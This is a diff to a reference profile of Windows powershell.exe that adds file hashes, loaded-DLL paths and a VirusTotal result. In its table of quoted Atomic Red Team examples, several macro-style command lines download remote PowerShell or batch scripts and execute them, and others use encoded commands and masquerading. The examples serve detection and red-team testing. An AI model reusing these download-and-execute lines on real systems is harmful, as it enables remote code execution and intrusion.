@@ -18,6 +18,9 @@ SHA256 | `DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C`
 SHA384 | `6A8916B36014D3E2EBDAB5A948EF39808E6159F0FCE3EA4334BB7AE89BAB694AA54F235ED3AACFC63D354B0A6B51900D`
 SHA512 | `BD98C8AEE1138D17C39F2FB0E09BF79EF2D6096464CEB459CC66C5FB670DF093414A373BBB4B4D8E7063C2EACB120449C45DF218033F2258F56BEC1618B43C4C`
 SSDEEP | `6144:+srKopvMWwO9sV1yZywi/PzNKXzJ7BapCK5d3klRzULOnWyjLsPhAQzqO:BrKopEW2KXzJ4pdd3klnnWosPhnzq`
+IMP | `741776AACCFC5B71FF59832DCDCACE0F`
+PESHA1 | `D26D99E01EDFABF842342DFFA2DDE1EAC7F803B7`
+PE256 | `68705285F7914823244E19E4F6DBC4A75C4DE807EA1CF128AEC2CCAFCE5FE109`
 
 ## Runtime Data
 
@@ -161,8 +164,85 @@ Unexpected token 'help' in expression or statement.
 
 Path |
 -- |
+C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2009.7-0\MpOav.dll |
+C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.Mf49f6405#\eef1c844e068e37a11b89ec1bfe58c6a\Microsoft.Management.Infrastructure.ni.dll |
+C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.P6f792626#\c8e961023e9ebb284f5ac038896f7f8b\Microsoft.PowerShell.Security.ni.dll |
+C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.Pb378ec07#\09c476bb8e1a5db27f8b3af858e06714\Microsoft.PowerShell.ConsoleHost.ni.dll |
+C:\Windows\assembly\NativeImages_v4.0.30319_64\mscorlib\5543cca0df435801e2303ff46a482ed5\mscorlib.ni.dll |
+C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Configuration\875dc3cfd53efc9f9a5c63016cd239d7\System.Configuration.ni.dll |
+C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Core\f29b1120627489754c4b8dd317bbe950\System.Core.ni.dll |
+C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Data\a39e284ddde9013349d1f350607766b8\System.Data.ni.dll |
+C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Dired13b18a9#\056cc0ec5d17f063bfd68aef0dfdff2e\System.DirectoryServices.ni.dll |
+C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\bb0ca52db926eaec4a94a8b656f61a94\System.Management.Automation.ni.dll |
+C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Management\35d31e1630335aeb7e7cb2ed836e7230\System.Management.ni.dll |
+C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Numerics\65da063a028c3cfc846f5ddfffc32558\System.Numerics.ni.dll |
+C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Transactions\c474b0144ec78b5ee7d68047d878855e\System.Transactions.ni.dll |
+C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Xml\488d073901c2c0fb8ccbcbe182b6b160\System.Xml.ni.dll |
+C:\Windows\assembly\NativeImages_v4.0.30319_64\System\6885802f40fd803e49150d8a2b43a09b\System.ni.dll |
+C:\Windows\Microsoft.Net\assembly\GAC_64\System.Data\v4.0_4.0.0.0__b77a5c561934e089\System.Data.dll |
+C:\Windows\Microsoft.Net\assembly\GAC_64\System.Transactions\v4.0_4.0.0.0__b77a5c561934e089\System.Transactions.dll |
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll |
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll |
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll |
+C:\Windows\System32\ADVAPI32.dll |
+C:\Windows\SYSTEM32\amsi.dll |
+C:\Windows\System32\AppxSip.dll |
+C:\Windows\SYSTEM32\ATL.DLL |
+C:\Windows\System32\bcrypt.dll |
+C:\Windows\System32\bcryptPrimitives.dll |
+C:\Windows\System32\cfgmgr32.dll |
+C:\Windows\System32\clbcatq.dll |
+C:\Windows\System32\combase.dll |
+C:\Windows\System32\coml2.dll |
+C:\Windows\System32\CRYPT32.dll |
+C:\Windows\SYSTEM32\CRYPTBASE.dll |
+C:\Windows\System32\CRYPTSP.dll |
+C:\Windows\System32\GDI32.dll |
+C:\Windows\System32\gdi32full.dll |
+C:\Windows\SYSTEM32\gpapi.dll |
+C:\Windows\SYSTEM32\iertutil.dll |
+C:\Windows\System32\IMM32.DLL |
+C:\Windows\System32\kernel.appcore.dll |
+C:\Windows\System32\KERNEL32.DLL |
+C:\Windows\System32\KERNELBASE.dll |
+C:\Windows\SYSTEM32\mintdh.dll |
+C:\Windows\System32\MSASN1.dll |
+C:\Windows\SYSTEM32\mscoree.dll |
+C:\Windows\System32\MSISIP.DLL |
+C:\Windows\System32\msvcp_win.dll |
+C:\Windows\SYSTEM32\MSVCR120_CLR0400.dll |
+C:\Windows\System32\msvcrt.dll |
 C:\Windows\SYSTEM32\ntdll.dll |
+C:\Windows\System32\OLE32.dll |
+C:\Windows\System32\OLEAUT32.dll |
+C:\Windows\SYSTEM32\OpcServices.DLL |
+C:\Windows\System32\powrprof.dll |
+C:\Windows\System32\profapi.dll |
+C:\Windows\System32\psapi.dll |
+C:\Windows\System32\RPCRT4.dll |
+C:\Windows\system32\rsaenh.dll |
+C:\Windows\System32\sechost.dll |
+C:\Windows\SYSTEM32\secur32.dll |
+C:\Windows\System32\shcore.dll |
+C:\Windows\System32\shell32.dll |
+C:\Windows\System32\SHLWAPI.dll |
+C:\Windows\SYSTEM32\SSPICLI.DLL |
+C:\Windows\SYSTEM32\tdh.dll |
+C:\Windows\System32\ucrtbase.dll |
+C:\Windows\SYSTEM32\urlmon.dll |
+C:\Windows\System32\USER32.dll |
+C:\Windows\SYSTEM32\USERENV.dll |
+C:\Windows\system32\uxtheme.dll |
+C:\Windows\SYSTEM32\VERSION.dll |
+C:\Windows\System32\win32u.dll |
+C:\Windows\System32\windows.storage.dll |
 C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe |
+C:\Windows\System32\WindowsPowerShell\v1.0\pwrshsip.dll |
+C:\Windows\System32\wintrust.dll |
+C:\Windows\SYSTEM32\wldp.dll |
+C:\Windows\System32\WS2_32.dll |
+C:\Windows\System32\wshext.dll |
+C:\Windows\SYSTEM32\XmlLite.dll |
 
 
 ## Signature
@@ -182,7 +262,12 @@ C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe |
 * Product Version: 10.0.17763.1
 * Language: English (United States)
 * Legal Copyright:  Microsoft Corporation. All rights reserved.
+* Machine Type: 64-bit
 
+## File Scan
+
+* VirusTotal Detections: 0/68
+* VirusTotal Link: https://www.virustotal.com/gui/file/de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c/detection/
 
 ## File Similarity (ssdeep match)
 
@@ -282,7 +367,7 @@ Source | Source File | Example | License
 [atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [Atomic_Friday.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Atomic_Friday/2020-06-05/Atomic_Friday.md) | `(index="botsv3" OR index="botsv2") powershell.exe source="WinEventLog:Microsoft-Windows-Sysmon/Operational" \| stats values(CommandLine) by Computer` | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
 [atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [Office_Macro_COM.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/Office_Macro_COM.md) | SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe IWR -uri ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.bat"" -OutFile ""~\Documents\payload.bat"" ; ~\Documents\payload.bat", "C:\Windows\System32", Null, 0 | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
 [atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [Office_Macro_COM.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/Office_Macro_COM.md) | objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1')", Null, objConfig, intProcessID | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
-[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [Office_Macro_COM.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/Office_Macro_COM.md) | objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail_benign.ps1')", Null, objConfig, intProcessID | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
+[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [Office_Macro_COM.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/Office_Macro_COM.md) | objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/dragonstail_benign.ps1')", Null, objConfig, intProcessID | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
 [atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #5: Masquerading - powershell.exe running as taskhostw.exe [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
 [atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #5: Masquerading - powershell.exe running as taskhostw.exe [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
 [atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1027.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.md) | powershell.exe -EncodedCommand $EncodedCommand | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
